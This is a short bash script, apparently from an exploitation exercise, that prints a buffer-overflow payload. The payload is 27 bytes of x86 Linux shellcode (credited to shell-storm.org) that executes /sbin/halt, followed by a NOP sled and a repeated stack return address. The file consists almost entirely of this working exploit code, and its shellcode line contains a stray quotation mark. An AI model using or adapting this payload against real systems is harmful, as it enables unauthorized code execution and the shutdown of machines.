#!/bin/bash

#http://shell-storm.org/shellcode/files/shellcode-483.php
#27 bytes
#halt

echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x6c\x74\x68\x6e\x2f\x68\x61\x68\x2f\x73\x62\x69\x89\xe3\x52\x53"\x89\xe1\xcd\x80"

for i in $(seq 28 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x1c\xd4\xff\xff"
done